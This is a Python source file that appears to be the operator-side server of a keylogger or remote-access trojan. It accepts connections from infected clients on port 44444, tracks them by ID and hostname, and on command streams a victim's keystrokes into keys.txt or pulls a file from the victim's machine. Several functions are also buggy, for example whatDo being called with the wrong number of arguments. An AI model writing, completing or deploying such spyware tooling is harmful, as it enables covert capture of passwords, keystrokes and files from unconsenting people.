from __future__ import print_function
import socket
import datetime
import threading
import sys


def newConn(c, addr):
    while (True):
        try:
            c.getpeername()
        except:
            ip = findClientBySocket(c)
            hostname = findClient(c)[3]
            sys.stdout.write(str(ip) + "/" + hostname + " has disconnected...\n>")
            sys.stdout.flush()
            return;


def getIP():
    s = socket.socket()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('google.com', 0))
    host = s.getsockname()[0]
    s.close()
    return host


def findClientBySocket(socket):
    for i in range(0, len(clientList)):
        if (socket == clientList[i][0]):
            return clientList[i][1][0]

    print("Socket could not be matched to client")


def findClient(socket):
    for i in xrange(len(clientList)):
        if (socket == clientList[i][0]):
            return clientList[i]
        else:
            print("socket not found...")


def findSocketById(iD):
    for i in xrange(len(clientList)):
        if (int(iD) == clientList[i][2]):
            return clientList[i][0]
        else:
            print(str(iD) + " not found...")


port = 44444
s = socket.socket()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((getIP(), port))
s.listen(5)
clientList = []
Id = 0


def trimMessage(m):
    newM = m.split('\x00')[0]
    return newM


def waitForConns():
    print("Waiting for connections...\n")
    while (True):
        c, addr = s.accept()
        hostname = trimMessage(c.recv(256))
        global Id
        Id = Id + 1
        iD = Id
        clientList.append([c, addr, iD, hostname])
        t = threading.Thread(target=newConn, args=[c, addr])
        t.setDaemon(True)
        t.start()


def printClients():
    print("Here are the clients you have:")
    for i in range(0, len(clientList)):
        print(str(clientList[i][2]) + ". " + str(clientList[i][1][0]))


def keyLog(socket):
    socket.sendall("log")
    recvKeyLogs(socket)


def recvKeyLogs(socket):
    host = findClient(socket)[3]
    date = str(datetime.date.today())
    f = open('keys.txt', 'w')
    while (True):
        key = socket.recv(512)
        f.write(key)
        print(key[0][0])


def whatDo(iD, cmd):
    socket = findSocketById(iD)
    if (cmd == "log"):
        keyLog(socket)
    elif ("list" in cmd):
        printClients()
    elif ("download" in cmd):
        downloadFile(socket)


def getUserCmd():
    while (True):
        if (len(clientList) > 0):
            cmd = raw_input(">")
            if (cmd == ""):
                print("enter command")
                continue
            cmd = cmd.lower().split()
            whatDo(cmd)


def downloadFile(socket):
    socket.send("send")
    f = open("test.jpg", "w")
    while (True):
        line = socket.recv(1024)
        print(line)
        f.write(line)


def main():
    t = threading.Thread(target=waitForConns)
    t.setDaemon(True)
    t.start()
    getUserCmd()


main()
